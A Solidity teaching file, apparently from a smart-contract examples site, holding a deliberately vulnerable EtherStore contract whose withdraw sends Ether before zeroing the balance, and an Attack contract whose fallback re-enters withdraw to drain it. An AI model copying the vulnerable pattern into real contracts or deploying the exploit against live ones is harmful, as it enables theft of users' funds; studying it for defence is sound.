// SPDX-License-Identifier: MIT
// Code from: https://solidity-by-example.org/hacks/re-entrancy

pragma solidity ^0.8.13;

contract EtherStore {
  mapping(address => uint256) public balances;

  function deposit() public payable {
    balances[msg.sender] += msg.value;
  }

  function withdraw() public {
    uint256 bal = balances[msg.sender];
    require(bal > 0);

    (bool sent, ) = msg.sender.call{ value: bal }("");
    require(sent, "Failed to send Ether");

    balances[msg.sender] = 0;
  }

  // Helper function to check the balance of this contract
  function getBalance() public view returns (uint256) {
    return address(this).balance;
  }
}

contract Attack {
  EtherStore public etherStore;

  constructor(address _etherStoreAddress) {
    etherStore = EtherStore(_etherStoreAddress);
  }

  // Fallback is called when EtherStore sends Ether to this contract.
  fallback() external payable {
    if (address(etherStore).balance >= 1 ether) {
      etherStore.withdraw();
    }
  }

  function attack() external payable {
    require(msg.value >= 1 ether);
    etherStore.deposit{ value: 1 ether }();
    etherStore.withdraw();
  }

  // Helper function to check the balance of this contract
  function getBalance() public view returns (uint256) {
    return address(this).balance;
  }
}
